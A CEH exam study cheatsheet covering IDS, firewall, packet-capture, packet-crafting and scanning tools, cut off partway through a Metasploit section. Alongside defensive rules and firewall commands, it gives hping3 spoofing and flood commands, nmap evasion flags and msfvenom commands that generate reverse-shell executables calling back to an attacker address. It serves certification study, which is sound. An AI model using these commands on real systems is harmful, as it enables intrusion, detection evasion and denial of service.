# 📋 CEH Module 12 — Tools Cheatsheet
> **IDS / IPS / Firewalls / Honeypots / Evasion**
> All tools, all commands, all explained in one place.

---

## Table of Contents
- [IDS Tools](#-ids-tools)
  - [Snort](#snort)
  - [Suricata](#suricata)
  - [Zeek](#zeek)
  - [OSSEC / Wazuh](#ossec--wazuh)
  - [Security Onion](#security-onion)
- [Firewall Tools](#-firewall-tools)
  - [iptables](#iptables)
  - [firewalld](#firewalld)
  - [Windows Firewall — netsh](#windows-firewall--netsh)
  - [Windows Firewall — PowerShell](#windows-firewall--powershell)
  - [pfSense / OPNsense](#pfsense--opnsense)
- [Traffic Capture & Analysis](#-traffic-capture--analysis)
  - [tcpdump](#tcpdump)
  - [Wireshark CLI — tshark](#wireshark-cli--tshark)
- [Packet Crafting & Traffic Generation](#-packet-crafting--traffic-generation)
  - [hping3](#hping3)
  - [Scapy](#scapy)
  - [Ostinato](#ostinato)
  - [Colasoft Packet Builder](#colasoft-packet-builder)
  - [WireEdit](#wireedit)
  - [NetScanTools Pro](#netscantoolspro)
  - [WAN Killer](#wan-killer)
- [Scanning & Enumeration](#-scanning--enumeration)
  - [Nmap](#nmap)
- [Exploitation & Payload Generation](#-exploitation--payload-generation)
  - [Metasploit — msfvenom](#metasploit--msfvenom)
  - [Metasploit — msfconsole](#metasploit--msfconsole)
- [Tunneling Tools](#-tunneling-tools)
  - [SSH (OpenSSH)](#ssh-openssh)
  - [Chisel](#chisel)
  - [HTTPort / HTTHost](#httport--htthost)
  - [iodine (DNS Tunnel)](#iodine-dns-tunnel)
  - [dnscat2 (DNS Tunnel)](#dnscat2-dns-tunnel)
  - [ptunnel-ng (ICMP Tunnel)](#ptunnel-ng-icmp-tunnel)
  - [PingRAT (ICMP C2)](#pingrat-icmp-c2)
  - [Green Tunnel](#green-tunnel)
- [Evasion & Obfuscation Tools](#-evasion--obfuscation-tools)
  - [Hyperion (PE Encryptor)](#hyperion-pe-encryptor)
  - [YARA](#yara)
  - [KoviD (Linux Rootkit)](#kovid-linux-rootkit)
- [NAC Bypass Tools](#-nac-bypass-tools)
  - [VLANPWN](#vlanpwn)
  - [nac_bypass_setup.sh](#nac_bypass_setupsh)
- [Honeypot Tools](#-honeypot-tools)
  - [Cowrie](#cowrie)
  - [T-Pot](#t-pot)
  - [Honeyd](#honeyd)
- [Honeypot Detection Tools](#-honeypot-detection-tools)
  - [Send-Safe Honeypot Hunter](#send-safe-honeypot-hunter)
  - [Detecting Honeypots with nmap / arp-scan](#detecting-honeypots-with-nmap--arp-scan)
- [Windows Endpoint Evasion Commands](#-windows-endpoint-evasion-commands)
  - [BITS Abuse — bitsadmin](#bits-abuse--bitsadmin)
  - [BITS Abuse — PowerShell](#bits-abuse--powershell)
  - [LoLBins Quick Reference](#lolbins-quick-reference)
  - [AMSI Bypass — PowerShell](#amsi-bypass--powershell)
  - [Process Injection — Windows API](#process-injection--windows-api)
- [Countermeasure Commands](#-countermeasure-commands)
  - [iptables Hardening](#iptables-hardening)
  - [Sysmon](#sysmon)
  - [PowerShell Hardening](#powershell-hardening)
  - [Windows Defender ASR Rules](#windows-defender-asr-rules)
  - [Audit BITS Jobs](#audit-bits-jobs)
  - [Disable DTP on Cisco IOS](#disable-dtp-on-cisco-ios)

---

## 🔍 IDS Tools

### Snort

> Open-source signature-based NIDS/NIPS. Compares packets against a rule database and alerts, logs, or drops on matches.

```bash
# Check version
snort -V

# Sniffer mode — print packet headers to console (no rules, just watch)
sudo snort -i eth0 -v

# Packet logger mode — write full packets to disk
sudo mkdir -p /var/log/snort
sudo snort -i eth0 -l /var/log/snort -K ascii

# Full NIDS mode — use config + rules, print alerts to console
sudo snort -i eth0 -c /etc/snort/snort.conf -A console

# Full NIDS mode — quiet (no banner), alerts to console
sudo snort -i eth0 -c /etc/snort/snort.conf -A console -q

# Test config file for syntax errors (dry run — don't actually start)
sudo snort -T -c /etc/snort/snort.conf

# Run against a saved pcap file (offline analysis — no live interface needed)
sudo snort -c /etc/snort/snort.conf -r capture.pcap -A console -q

# Daemon mode — run in background, log unified2 format for SIEM ingestion
sudo snort -i eth0 -c /etc/snort/snort.conf -A unified2 -D

# List all rules loaded by a config
sudo snort -c /etc/snort/snort.conf --list-rules 2>&1 | tail -5
```

**Custom rule syntax** (`/etc/snort/rules/local.rules`):
```
# Structure: action protocol src_ip src_port -> dst_ip dst_port (options)

# Alert on any ICMP (ping)
alert icmp any any -> $HOME_NET any (msg:"ICMP Ping Detected"; sid:1000001; rev:1;)

# Alert on inbound Telnet (port 23)
alert tcp any any -> $HOME_NET 23 (msg:"Telnet Connection Attempt"; sid:1000002; rev:1;)

# Alert on inbound RDP (port 3389)
alert tcp any any -> $HOME_NET 3389 (msg:"Inbound RDP attempt"; sid:1000010; rev:1;)

# Drop inbound Telnet (IPS/inline mode — blocks, not just alerts)
drop tcp any any -> $HOME_NET 23 (msg:"Blocked inbound Telnet"; sid:2000001; rev:1;)

# Real-world example: EternalBlue (MS17-010) detection
alert tcp $EXTERNAL_NET any -> $HOME_NET 445 (
    msg:"ET EXPLOIT MS17-010 EternalBlue SMB RCE Attempt";
    flow:to_server,established;
    content:"|FF|SMB|73|";
    content:"|00 00 00 00 00 00 00 00|"; distance:0;
    reference:cve,2017-0144;
    classtype:attempted-admin;
    sid:2024217; rev:5;
)
```

| Rule option | Meaning |
|---|---|
| `msg` | Human-readable alert label |
| `flow:to_server,established` | Only match packets going TO the server on an established session |
| `content:"\|FF\|..."` | Match exact hex bytes in the payload |
| `distance:0` | Next content match starts immediately after the previous one |
| `classtype` | Priority classification of the alert |
| `sid` | Unique rule ID — custom rules use ≥ 1,000,000 |
| `rev` | Rule revision number |

---

### Suricata

> Multi-threaded NIDS/NIPS. Faster than Snort on multi-core systems. Supports IDS (alert) and IPS (block) modes, file extraction, TLS fingerprinting, and Eve JSON logging.

```bash
# Install
sudo apt install -y suricata

# Run in IDS mode on a live interface
sudo suricata -c /etc/suricata/suricata.yaml -i eth0

# Run against a saved pcap (offline — no interface needed)
sudo suricata -c /etc/suricata/suricata.yaml -r capture.pcap -l /var/log/suricata/

# Watch alerts in real time (fast.log = one line per alert)
tail -f /var/log/suricata/fast.log

# Watch full JSON alert log (more detail — feeds SIEMs)
tail -f /var/log/suricata/eve.json | python3 -m json.tool

# Update rule sets
sudo suricata-update
sudo suricata-update list-sources          # list all available rule sources
sudo suricata-update enable-source et/open # enable Emerging Threats Open rules

# Test config file
sudo suricata -T -c /etc/suricata/suricata.yaml

# ── IPS (inline blocking) mode via Linux NFQUEUE ──────────────────────────
# Step 1: redirect traffic into a queue so Suricata can accept/drop each packet
sudo iptables -I FORWARD -j NFQUEUE --queue-num 0
sudo iptables -I INPUT   -j NFQUEUE --queue-num 0
sudo iptables -I OUTPUT  -j NFQUEUE --queue-num 0

# Step 2: run Suricata listening on that queue
sudo suricata -c /etc/suricata/suricata.yaml -q 0

# Step 3: to actually BLOCK (not just alert), change rule action to "drop":
# drop tcp any any -> $HOME_NET 23 (msg:"Block Telnet"; sid:2000001; rev:1;)
```

---

### Zeek

> Network analysis framework — protocol anomaly detection and behavioral analysis rather than signature matching. Generates structured logs per protocol (conn.log, dns.log, http.log, etc.).

```bash
# Install (check docs.zeek.org for current repo setup for your distro)
sudo apt install -y zeek

# Run live on an interface
sudo zeek -i eth0

# Analyze a saved pcap offline
zeek -r capture.pcap

# Inspect the connection log — source/dest IPs, ports, protocol, service
cat conn.log | zeek-cut id.orig_h id.orig_p id.resp_h id.resp_p proto service duration

# Inspect DNS log — all DNS queries and responses
cat dns.log | zeek-cut id.orig_h query qtype_name answers

# Inspect HTTP log — all HTTP requests
cat http.log | zeek-cut id.orig_h id.resp_h method host uri status_code

# Count top talkers by connection count
cat conn.log | zeek-cut id.orig_h | sort | uniq -c | sort -rn | head -10
```

---

### OSSEC / Wazuh

> HIDS — monitors individual hosts for log events, file integrity changes, rootkits, and policy violations. Wazuh is the actively maintained fork of OSSEC.

```bash
# ── Wazuh Manager (server that aggregates all agents) ──────────────────────
# Install via official script (always verify URL against wazuh.com docs first)
curl -sO https://packages.wazuh.com/4.x/wazuh-install.sh
sudo bash ./wazuh-install.sh -a    # -a = all-in-one (manager + indexer + dashboard)

# Check manager status
sudo systemctl status wazuh-manager

# ── Wazuh Agent (installed on each monitored host) ──────────────────────────
sudo apt install -y wazuh-agent

# Configure agent to point to your manager
sudo nano /var/ossec/etc/ossec.conf
# Set: <server><address>MANAGER_IP</address></server>

sudo systemctl enable wazuh-agent
sudo systemctl start wazuh-agent

# ── Key config options in ossec.conf ────────────────────────────────────────
# File Integrity Monitoring — watch these directories
# <syscheck>
#   <directories check_all="yes">/etc,/usr/bin,/usr/sbin</directories>
#   <directories check_all="yes">/bin,/sbin</directories>
# </syscheck>

# Real-time alerts — watch log files
# <localfile>
#   <log_format>syslog</log_format>
#   <location>/var/log/auth.log</location>
# </localfile>

# View live alerts (manager side)
sudo tail -f /var/ossec/logs/alerts/alerts.log
```

---

### Security Onion

> All-in-one Linux distro bundling Suricata + Zeek + Wazuh + Elastic Stack (SIEM). Fastest way to stand up a full NIDS + HIDS + log-analysis stack.

```bash
# After installing the ISO (securityonion.net) and running sosetup:

# Check status of all components
sudo so-status

# Restart all Security Onion services
sudo so-restart

# Update rules
sudo so-rule-update

# Access the web console (Kibana-based dashboard)
# https://<management_ip>   (port 443)

# View Suricata alerts from CLI
sudo so-suricata-start          # start Suricata
tail -f /nsm/suricata/eve.json  # watch JSON alert stream

# Run a packet capture on the sniffing interface
sudo so-tcpdump -i eth1 -w /tmp/capture.pcap

# Search logs with so-grep
sudo so-grep "alert" /nsm/suricata/eve.json | head -20
```

---

## 🧱 Firewall Tools

### iptables

> Linux kernel-level stateful packet filter. The core firewall on most Linux systems. Rules are evaluated top-down; first match wins.

```bash
# ── View rules ───────────────────────────────────────────────────────────────
sudo iptables -L -n -v --line-numbers     # list all rules with line numbers
sudo iptables -L INPUT -n -v              # list INPUT chain only
sudo iptables -t nat -L -n -v             # list NAT table rules

# ── Default policy (deny-by-default) ─────────────────────────────────────────
sudo iptables -P INPUT DROP               # drop all inbound by default
sudo iptables -P FORWARD DROP             # drop all forwarded traffic by default
sudo iptables -P OUTPUT ACCEPT            # allow all outbound by default

# ── Allow essential traffic ────────────────────────────────────────────────────
sudo iptables -A INPUT -i lo -j ACCEPT                          # loopback (always needed)
sudo iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT  # stateful — allow return traffic

# ── Allow specific services ───────────────────────────────────────────────────
sudo iptables -A INPUT -p tcp --dport 22  -j ACCEPT             # SSH
sudo iptables -A INPUT -p tcp --dport 80  -j ACCEPT             # HTTP
sudo iptables -A INPUT -p tcp --dport 443 -j ACCEPT             # HTTPS

# Allow SSH only from a trusted management subnet
sudo iptables -A INPUT -p tcp -s 192.168.1.0/24 --dport 22 -j ACCEPT

# ── Block specific traffic ────────────────────────────────────────────────────
sudo iptables -A INPUT -p tcp --dport 23 -j DROP                # block Telnet inbound
sudo iptables -A INPUT -s 203.0.113.66 -j DROP                  # block a specific IP

# ── Anti-spoofing (drop packets claiming to be from private ranges) ────────────
sudo iptables -A INPUT -i eth0 -s 10.0.0.0/8     -j DROP
sudo iptables -A INPUT -i eth0 -s 172.16.0.0/12  -j DROP
sudo iptables -A INPUT -i eth0 -s 192.168.0.0/16 -j DROP
sudo iptables -A INPUT -i eth0 -s 127.0.0.0/8    -j DROP

# ── ICMP filtering (allow only necessary types) ────────────────────────────────
sudo iptables -A INPUT -p icmp --icmp-type 3  -j ACCEPT         # Destination Unreachable
sudo iptables -A INPUT -p icmp --icmp-type 11 -j ACCEPT         # Time Exceeded (traceroute)
sudo iptables -A INPUT -p icmp -j DROP                          # drop all other ICMP

# ── NAT / Masquerading (turn Linux into a router) ─────────────────────────────
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE       # PAT/NAT overload
sudo sysctl -w net.ipv4.ip_forward=1                             # enable IP forwarding

# ── DNS restriction (only allow DNS to your approved resolver) ────────────────
sudo iptables -A OUTPUT -p udp --dport 53 ! -d 192.168.1.1 -j DROP
sudo iptables -A OUTPUT -p tcp --dport 53 ! -d 192.168.1.1 -j DROP

# ── Redirect traffic to NFQUEUE for Suricata IPS ─────────────────────────────
sudo iptables -I FORWARD -j NFQUEUE --queue-num 0
sudo iptables -I INPUT   -j NFQUEUE --queue-num 0

# ── Save and restore rules ────────────────────────────────────────────────────
sudo apt install -y iptables-persistent
sudo netfilter-persistent save             # save current rules to disk
sudo netfilter-persistent reload           # reload saved rules

# ── Delete rules ─────────────────────────────────────────────────────────────
sudo iptables -D INPUT 3                   # delete rule #3 from INPUT chain
sudo iptables -F                           # flush ALL rules (dangerous — resets to policy)
sudo iptables -F INPUT                     # flush INPUT chain only

# ── Block source-routed packets ───────────────────────────────────────────────
sudo sysctl -w net.ipv4.conf.all.accept_source_route=0
sudo sysctl -w net.ipv6.conf.all.accept_source_route=0
# Make permanent — add to /etc/sysctl.conf:
# net.ipv4.conf.all.accept_source_route = 0
```

---

### firewalld

> Zone-based firewall manager for Linux (default on RHEL/CentOS/Fedora/Rocky). Rules are zone-based — each interface is assigned a zone with its own rule set.

```bash
# ── Status and zones ─────────────────────────────────────────────────────────
sudo firewall-cmd --state                          # running / not running
sudo firewall-cmd --get-active-zones               # which zones are active + their interfaces
sudo firewall-cmd --list-all                       # show all rules for the default zone
sudo firewall-cmd --list-all --zone=public         # show rules for a specific zone

# ── Allow / deny services ─────────────────────────────────────────────────────
sudo firewall-cmd --zone=public --add-service=https --permanent
sudo firewall-cmd --zone=public --add-service=ssh   --permanent
sudo firewall-cmd --zone=public --remove-service=telnet --permanent

# Allow a custom port
sudo firewall-cmd --zone=public --add-port=8443/tcp --permanent
sudo firewall-cmd --zone=public --remove-port=8443/tcp --permanent

# Apply all permanent changes
sudo firewall-cmd --reload

# ── Rich rules (more precise — specific IPs, logging, etc.) ──────────────────
# Allow SSH only from a management subnet
sudo firewall-cmd --permanent --zone=public \
  --add-rich-rule='rule family="ipv4" source address="192.168.1.0/24" port protocol="tcp" port="22" accept'

# Block a specific IP completely
sudo firewall-cmd --permanent --zone=public \
  --add-rich-rule='rule family="ipv4" source address="203.0.113.66" reject'

# Log and drop inbound Telnet attempts
sudo firewall-cmd --permanent --zone=public \
  --add-rich-rule='rule family="ipv4" port protocol="tcp" port="23" log prefix="TELNET-BLOCKED: " level="warning" drop'

sudo firewall-cmd --reload

# ── NAT / Masquerading ────────────────────────────────────────────────────────
sudo firewall-cmd --zone=public --add-masquerade --permanent
sudo firewall-cmd --reload

# ── Panic mode (emergency — drop ALL traffic immediately) ────────────────────
sudo firewall-cmd --panic-on              # block everything NOW
sudo firewall-cmd --panic-off             # restore normal rules
sudo firewall-cmd --query-panic           # check if panic mode is on
```

---

### Windows Firewall — netsh

> Command-line interface to Windows Firewall (works on all Windows versions including Server).

```cmd
:: View status of all profiles (Domain, Private, Public)
netsh advfirewall show allprofiles

:: Turn firewall on/off per profile
netsh advfirewall set publicprofile state on
netsh advfirewall set allprofiles state on

:: Show all existing firewall rules
netsh advfirewall firewall show rule name=all

:: Allow inbound HTTPS (port 443)
netsh advfirewall firewall add rule name="Allow HTTPS In" dir=in action=allow protocol=TCP localport=443

:: Allow inbound RDP only from a specific subnet
netsh advfirewall firewall add rule name="Allow RDP - Mgmt Only" dir=in action=allow protocol=TCP localport=3389 remoteip=192.168.1.0/24

:: Block inbound Telnet (port 23)
netsh advfirewall firewall add rule name="Block Telnet In" dir=in action=block protocol=TCP localport=23

:: Block outbound SMB (port 445) — prevents lateral movement
netsh advfirewall firewall add rule name="Block Outbound SMB" dir=out action=block protocol=TCP remoteport=445

:: Delete a rule by name
netsh advfirewall firewall delete rule name="Block Telnet In"

:: Reset all firewall rules to defaults
netsh advfirewall reset
```

---

### Windows Firewall — PowerShell

> Modern, scriptable alternative to netsh for Windows Firewall management.

```powershell
# View all firewall rules
Get-NetFirewallRule | Select-Object DisplayName, Direction, Action, Enabled

# View only enabled inbound rules
Get-NetFirewallRule -Direction Inbound -Enabled True | Select-Object DisplayName, Action

# Allow inbound HTTPS
New-NetFirewallRule -DisplayName "Allow HTTPS In" -Direction Inbound `
  -Protocol TCP -LocalPort 443 -Action Allow

# Allow inbound RDP from a specific IP range only
New-NetFirewallRule -DisplayName "Allow RDP - Mgmt" -Direction Inbound `
  -Protocol TCP -LocalPort 3389 -RemoteAddress 192.168.1.0/24 -Action Allow

# Block inbound Telnet
New-NetFirewallRule -DisplayName "Block Telnet In" -Direction Inbound `
  -Protocol TCP -LocalPort 23 -Action Block

# Block outbound SMB
New-NetFirewallRule -DisplayName "Block Outbound SMB" -Direction Outbound `
  -Protocol TCP -RemotePort 445 -Action Block

# Disable a rule (without deleting it)
Disable-NetFirewallRule -DisplayName "Allow RDP - Mgmt"

# Delete a rule
Remove-NetFirewallRule -DisplayName "Block Telnet In"

# Enable all profiles
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled True

# Check current profile settings
Get-NetFirewallProfile | Select-Object Name, Enabled, DefaultInboundAction, DefaultOutboundAction
```

---

### pfSense / OPNsense

> Open-source firewall/router OS. Runs on dedicated hardware or a VM with 2+ NICs.

```bash
# ── Initial setup (run on the pfSense console) ────────────────────────────────
# 1. Assign interfaces: WAN = external NIC, LAN = internal NIC
# 2. Set LAN IP (default 192.168.1.1)
# 3. Access web GUI from a LAN client: https://192.168.1.1
#    Default login: admin / pfsense

# ── Adding Snort/Suricata as IPS (via package manager) ───────────────────────
# System → Package Manager → Available Packages → search "suricata" → Install
# After install: Services → Suricata → Add interface → configure rules

# ── From the pfSense shell (Diagnostics → Command Prompt or SSH) ─────────────

# View firewall rules
pfctl -sr

# View NAT rules
pfctl -sn

# Show current state table (active connections)
pfctl -ss

# Flush state table (drops all active connections — use carefully)
pfctl -Fs

# View interface stats
pfctl -si

# Enable/disable PF firewall
pfctl -e    # enable
pfctl -d    # disable

# Reload rules from config file
pfctl -f /etc/pf.conf

# ── Useful shell commands on pfSense ─────────────────────────────────────────
# View routing table
netstat -rn

# View active connections
netstat -an | grep ESTABLISHED

# Packet capture on WAN interface
tcpdump -i em0 -w /tmp/capture.pcap

# View DHCP leases
cat /var/dhcpd/var/db/dhcpd.leases
```

---

## 📡 Traffic Capture & Analysis

### tcpdump

> CLI packet capture tool. Captures raw packets from a network interface and displays or saves them.

```bash
# Capture everything on eth0, print to screen
sudo tcpdump -i eth0

# Capture and save to pcap file (for Wireshark analysis)
sudo tcpdump -i eth0 -w capture.pcap

# Capture only traffic to/from a specific host
sudo tcpdump -i eth0 host 192.168.1.50 -w host.pcap

# Capture only a specific port
sudo tcpdump -i eth0 port 80 -w http.pcap
sudo tcpdump -i eth0 port 53 -w dns.pcap

# Capture only TCP traffic
sudo tcpdump -i eth0 tcp -w tcp.pcap

# Capture only ICMP (ping traffic — useful for ICMP tunnel detection)
sudo tcpdump -i eth0 icmp -w icmp.pcap

# Capture with full packet payload (-X = hex + ASCII, -s 0 = full packet)
sudo tcpdump -i eth0 -X -s 0 -w full.pcap

# Read back a saved capture with human-readable output
tcpdump -r capture.pcap -nn              # -nn = don't resolve IPs or ports

# Detect packets with TCP window size = 0 (Layer 4 tar pit indicator)
tcpdump -i eth0 'tcp[14:2] = 0'

# Capture DNS traffic and show query names
sudo tcpdump -i eth0 -nn port 53

# Stop after capturing N packets
sudo tcpdump -i eth0 -c 100 -w capture.pcap
```

---

### Wireshark CLI — tshark

> CLI version of Wireshark. Same capture engine, scriptable and usable over SSH.

```bash
# List available interfaces
tshark -D

# Capture on eth0, print to screen
sudo tshark -i eth0

# Capture and save to pcap
sudo tshark -i eth0 -w capture.pcap

# Read a pcap and filter for HTTP traffic
tshark -r capture.pcap -Y "http"

# Read a pcap, show only DNS queries
tshark -r capture.pcap -Y "dns.flags.response == 0" -T fields -e dns.qry.name

# Show only TCP SYN packets (port scanning indicator)
tshark -r capture.pcap -Y "tcp.flags.syn==1 && tcp.flags.ack==0"

# Show all source IPs and destination ports (connection summary)
tshark -r capture.pcap -T fields -e ip.src -e tcp.dstport | sort | uniq -c | sort -rn

# Follow a TCP stream (reconstruct the conversation)
tshark -r capture.pcap -q -z follow,tcp,ascii,0
```

---

## 🛠️ Packet Crafting & Traffic Generation

### hping3

> CLI packet crafting tool. Sends custom TCP/UDP/ICMP packets with full control over every field. Essential for firewall rule testing and evasion technique demonstration.

```bash
# ── Basic probing ─────────────────────────────────────────────────────────────
# TCP SYN ping (check if host is up)
sudo hping3 -S -p 80 <target_ip>

# ICMP ping
sudo hping3 --icmp <target_ip>

# UDP probe
sudo hping3 --udp -p 53 <target_ip>

# ── Firewall evasion techniques ───────────────────────────────────────────────
# IP address spoofing — forge source IP
sudo hping3 -S -p 80 --spoof 192.168.1.10 <target_ip>

# ACK scan — send ACK packets (bypass stateless firewalls that allow ACK)
sudo hping3 -A -p 80 <target_ip>

# ACK tunnel — send ACK packets with a data payload
sudo hping3 -A -p 80 --data 100 <target_ip>
# --data 100 = attach 100 bytes of payload to the ACK packet

# Tiny fragments — split packets to evade shallow inspection
sudo hping3 -S -p 80 -d 8 <target_ip>
# -d 8 = 8-byte data size (forces IP fragmentation)

# Loose source routing — embed a route through a trusted hop
sudo hping3 --lsrr <trusted_hop_ip> -p 80 <target_ip>

# ── Firewalking — probe firewall ACL rules via TTL ─────────────────────────────
# Send SYN with TTL=10 — will expire if the firewall is more than 10 hops away
sudo hping3 -S --ttl 10 -p 80  <target_ip>
sudo hping3 -S --ttl 10 -p 443 <target_ip>
sudo hping3 -S --ttl 10 -p 22  <target_ip>

# ── DoS / Flooding ───────────────────────────────────────────────────────────
# SYN flood (test rate-limiting and IDS flood detection)
sudo hping3 -S --flood -p 80 <target_ip>

# UDP flood
sudo hping3 --udp -p 80 --flood <target_ip>

# ── IDS testing ───────────────────────────────────────────────────────────────
# RST with bad checksum (test invalid RST evasion)
sudo hping3 -R --badcksum -p 80 <target_ip>

# Send 10 SYN packets and show RTT per packet (timing analysis)
sudo hping3 -S -p 80 -c 10 <target_ip>
```

---

### Scapy

> Python-based interactive packet crafting framework. More flexible than hping3 — build any packet structure in code.

```python
from scapy.all import *

# ── Basic packet crafting ─────────────────────────────────────────────────────

# Send a TCP SYN to port 80
pkt = IP(dst="192.168.1.1")/TCP(dport=80, flags="S")
send(pkt)

# Craft an ICMP ping and receive the reply
reply = sr1(IP(dst="192.168.1.1")/ICMP(), timeout=2)
if reply:
    reply.show()

# IP spoofing — forge source IP in the packet
pkt = IP(src="10.0.0.99", dst="192.168.1.1")/TCP(dport=80, flags="S")
send(pkt)

# Fragment a packet manually
frags = fragment(IP(dst="192.168.1.1")/TCP(dport=80)/"A"*1000, fragsize=8)
send(frags)

# ACK packet with payload (ACK tunnel demonstration)
pkt = IP(dst="192.168.1.1")/TCP(dport=80, flags="A")/Raw(load="DATA_PAYLOAD")
send(pkt)

# ── Sniff traffic ─────────────────────────────────────────────────────────────
# Sniff 20 packets and print summaries
pkts = sniff(iface="eth0", count=20)
pkts.summary()

# Sniff only TCP traffic to port 23 (Telnet)
pkts = sniff(iface="eth0", filter="tcp port 23", count=10)
for p in pkts:
    p.show()

# Save captured packets to a pcap file
wrpcap("capture.pcap", pkts)

# Read a pcap file
pkts = rdpcap("capture.pcap")
```

---

### Ostinato

> Open-source cross-platform packet generator with GUI and Python API. Used for high-rate traffic generation and automated testing.

```python
# Python API example
from ostinato.core import ost_pb, DroneProxy

drone = DroneProxy('127.0.0.1')   # connect to Ostinato server (drone)
drone.connect()

port_id_list = drone.getPortIdList()
sc = drone.getStreamConfig(stream_id)

# Set stream rate: 100 packets per second
sc.stream[0].core.is_enabled = True
sc.stream[0].core.pps = 100

drone.modifyStream(sc)
drone.startTransmit(port_id_list)
# ... let it run ...
drone.stopTransmit(port_id_list)
drone.disconnect()
```

```bash
# CLI: replay a pcap at a specific rate using Ostinato drone
ostinato --port 7878 &               # start drone (background)
# Then use the GUI or Python API to configure streams and transmit
```

---

### Colasoft Packet Builder

> Windows GUI tool — build any packet from scratch, field by field. Used to test specific firewall rules.

```
Workflow for IDS rule testing:
1. Open Colasoft Packet Builder
2. Add Packet → choose Ethernet + IP + TCP (or UDP/ICMP)
3. Fill in each field: Source IP, Dest IP, Source Port, Dest Port, TCP Flags
4. In the "Hex Editor" panel: modify any raw byte directly
5. Send → select interface → set send interval and repeat count
6. Watch your IDS/Suricata console for the expected alert

Testing evasion:
- Fragment: set IP "More Fragments" flag = 1, Fragment Offset field
- ACK-only: set TCP Flags = 0x10 (ACK only, no SYN)
- Wrong checksum: manually edit checksum bytes in hex editor to a bad value
- Low TTL: set IP TTL to 1 or 2 to test TTL-based evasion
```

---

### WireEdit

> Linux GUI tool — open any pcap file and edit packet fields with point-and-click. Then replay with tcpreplay.

```bash
# Open a pcap for editing
wireedit capture.pcap

# After editing and saving as modified.pcap, replay it:
sudo tcpreplay -i eth0 modified.pcap

# Replay at a specific rate (Mbps)
sudo tcpreplay -i eth0 --mbps=10 modified.pcap

# Replay as fast as possible (stress test)
sudo tcpreplay -i eth0 --topspeed modified.pcap
```

---

### NetScanTools Pro

> Windows multi-function network testing toolkit.

```
Packet Flooder:
  Tools → Packet Flooder
  → Protocol: UDP or TCP
  → Target IP + Port
  → Packet Size: 64–1500 bytes
  → Rate: packets/second
  → Start → watch IDS for flood alerts

Packet Generator:
  Tools → Packet Generator
  → Build custom frame: set all header fields manually
  → Enable fragmentation: check "Fragment Packets", set MTU size
  → Send Once / Repeat / Continuous
```

---

### WAN Killer

> Part of SolarWinds Engineer's Toolset — generates high-volume UDP traffic.

```
WAN Killer → New Test:
  Target Host: <IP>
  Port: <any UDP port>
  Packet Size: 512 bytes (default) or custom
  Bandwidth: set % of link speed to consume
  Duration: 60 seconds
  Start → monitor IDS for volume-based alert
```

---

## 🔎 Scanning & Enumeration

### Nmap

> The standard network scanner. Every flag below has a specific evasion or enumeration purpose.

```bash
# ── Basic scans ───────────────────────────────────────────────────────────────
nmap <target>                    # default scan (SYN scan top 1000 ports)
nmap -sS <target>                # SYN scan (stealth — half-open, less logged)
nmap -sT <target>                # TCP connect scan (full connection — more detectable)
nmap -sU <target>                # UDP scan
nmap -sV <target>                # service version detection
nmap -O  <target>                # OS fingerprinting
nmap -A  <target>                # aggressive: OS + version + scripts + traceroute
nmap -p- <target>                # scan ALL 65,535 ports
nmap -p 22,80,443,3389 <target>  # scan specific ports only

# ── Firewall rule enumeration ─────────────────────────────────────────────────
nmap -sF <target>                # FIN scan (no SYN — bypasses stateless ACL rules)
nmap -sN <target>                # NULL scan (no flags at all)
nmap -sX <target>                # XMAS scan (FIN+PSH+URG flags)
nmap --traceroute -sS <target>   # traceroute + SYN scan (firewalking)
nmap --script firewalk <target>  # script-based firewalking
nmap --script firewall-bypass <target>  # automatic firewall bypass attempts

# ── IDS/Firewall evasion flags ────────────────────────────────────────────────
# Timing — slow down to avoid rate-based detection
nmap -T0 <target>   # Paranoid: 5-min delay between probes (very slow, very stealthy)
nmap -T1 <target>   # Sneaky: 15-second delay between probes
nmap -T2 <target>   # Polite: 0.4-second delay

# Fragmentation — split packets to bypass shallow inspection
nmap -f   <target>           # 8-byte IP fragments
nmap -f -f <target>          # 16-byte fragments (even smaller pieces)
nmap --mtu 24 <target>       # custom MTU (must be multiple of 8)

# Decoys — hide real IP among fake source IPs
nmap -D RND:10 <target>                    # 10 random decoy IPs
nmap -D 192.168.1.5,10.0.0.1,ME <target>  # named decoys + your real IP (ME)

# Source port spoofing — look like trusted traffic
nmap --source-port 53  <target>    # look like DNS traffic (port 53 usually trusted)
nmap --source-port 80  <target>    # look like web traffic
nmap -g 443 <target>               # same as --source-port 443

# Append random data — break length-based signatures
nmap --data-length 25 <target>     # add 25 random bytes to each packet

# MAC address spoofing (local network only)
nmap --spoof-mac 0     <target>    # random MAC address
nmap --spoof-mac Apple <target>    # spoof as Apple device (Apple OUI prefix)

# Idle / Zombie scan — scan target using another host's IP (attacker completely hidden)
# Step 1: find a zombie (idle host with predictable IP ID sequence)
nmap -O -v <zombie_candidate>
# Step 2: scan using that zombie
nmap -sI <zombie_ip> <target>
nmap -sI 192.168.1.50:80 <target>  # use specific port on zombie

# ── Host discovery ────────────────────────────────────────────────────────────
nmap -sn 192.168.1.0/24            # ping sweep (no port scan)
nmap -Pn <target>                  # skip host discovery (assume host is up)
nmap -PS22,80,443 <target>         # TCP SYN ping on specific ports

# ── Output formats ────────────────────────────────────────────────────────────
nmap -oN output.txt  <target>      # normal text output
nmap -oX output.xml  <target>      # XML output
nmap -oG output.gnmap <target>     # greppable output
nmap -oA output      <target>      # all three formats at once

# ── Banner grabbing ───────────────────────────────────────────────────────────
nmap -sV --version-intensity 9 -p 22,80,443,21,25 <target>
# --version-intensity 0-9: higher = more aggressive/accurate version probing
```

---

## 💣 Exploitation & Payload Generation

### Metasploit — msfvenom

> Payload generator and encoder. Produces shellcode, executables, scripts, and office macros for authorized penetration testing.

```bash
# ── List available payloads and encoders ──────────────────────────────────────
msfvenom --list payloads | grep windows
msfvenom --list encoders
msfvenom --list formats

# ── Basic payload generation ──────────────────────────────────────────────────
# Windows reverse TCP shell — exe format
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=192.168.1.100 LPORT=4444 \
  -f exe > shell.exe

# Windows reverse TCP shell — 64-bit
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=192.168.1.100 LPORT=4444 \
  -f exe > shell64.exe

# Linux reverse shell — ELF binary
msfvenom -p linux/x86/meterpreter/reverse_tcp \
  LHOST=192.168.1.100 LPORT=4444 \
  -f elf > shell.elf

# Python reverse shell script
msfvenom -p python/meterpreter/reverse_tcp \
